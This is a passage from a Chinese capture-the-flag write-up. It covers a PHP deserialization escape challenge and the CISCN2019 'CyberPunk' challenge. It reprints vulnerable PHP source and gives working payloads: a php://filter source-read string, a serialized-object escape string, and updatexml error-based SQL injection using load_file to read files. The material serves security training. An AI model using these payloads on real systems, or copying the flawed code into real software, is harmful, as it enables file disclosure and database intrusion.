<pre><code>a:4:{s:5:&quot;phone&quot;;s:6:&quot;123123&quot;;s:5:&quot;email&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;s:3:&quot;aaa&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}</code></pre><p>而是这样的</p>
<pre><code>a:4:{s:5:&quot;phone&quot;;s:6:&quot;123123&quot;;s:5:&quot;email&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;aaa&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}</code></pre><p>所以终版构造的photo是这样的</p>
<pre><code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p>一共是三十四个字符。<br>由于代码对username的检测，每多一个where被替换为hacker，就多一个字符的位置，为了替换后构造的photo能成功的被挤出去，也就需要三十四个where。<br>综上，payload为</p>
<pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p>如图传入再访问profile.php,在源代码得到flag。</p>
<p><a href="https://imgchr.com/i/0AEasU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AEasU.png" srcset="/img/loading.gif" alt="0AEasU.png"></a></p>
<p><img src="https://s1.ax1x.com/2020/09/27/0Ae1de.png" srcset="/img/loading.gif" alt="0Ae1de.png"></p>
<h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p><strong>考点：php伪协议、报错注入</strong></p>
<p>结合实事，来一道2077。</p>
<p>首页是个提交订单的页面，表单中提交姓名、电话、地址三个参数。下面还有几个订单管理的功能。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201129174439542.png" srcset="/img/loading.gif" alt="image-20201129174439542"></p>
<p>查看源码发现提示</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201129174455970.png" srcset="/img/loading.gif" alt="image-20201129174455970"></p>
<p>那就先试试用伪协议把源码读一读</p>
<p>payload:</p>
<pre><code>?file=php://filter/read=convert.base64-encode/resource=xxx.php</code></pre><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#change.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"订单修改成功"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"未找到订单!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#confirm.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//var_dump($_POST);</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$user_name</span><span class="token punctuation">.</span><span class="token string">"已提交订单"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span><span class="token punctuation">;</span>
        <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$re</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"sss"</span><span class="token punctuation">,</span> <span class="token variable">$user_name</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">,</span> <span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$re</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"订单提交成功"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#delete.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'delete from `user` where `user_id`='</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"user_id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"订单删除成功"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"未找到订单!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#index.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// $file = $_GET["file"];</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/phar|zip|bzip2|zlib|data|input|%00/i"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'no way!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    @<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#search.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span> 

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"&lt;p>姓名:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>&lt;p>, 电话:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>&lt;p>, 地址:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"未找到订单!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>重点关注change.php。</p>
<p>这个过滤只是看起来很严谨，但实际上他只对user_name和phone做了过滤，而参数address却被放过了，只对它进行了转义。</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
<span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p>再向下看代码：</p>
<p>这一部分原本意图是更改地址，但却把旧地址作为old_address重新存入了数据库中，而且再次进行了查询。</p>
<p>也就是说，如果先提交一个有单引号之类字符的payload，再用随便一个数据把它顶替成old_address，那么payload就不会被addslashes函数限制，并且作为old_address被成功触发。</p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//change.php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p>结合报错注入，payload如下：</p>
<pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,50)),0x7e),1)#</code></pre><p>结果load_file就显示了后半截。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207172844718.png" srcset="/img/loading.gif" alt="image-20201207172844718"></p>
<p>再读下前面的</p>
<pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201207173052006.png" srcset="/img/loading.gif" alt="image-20201207173052006"></p>
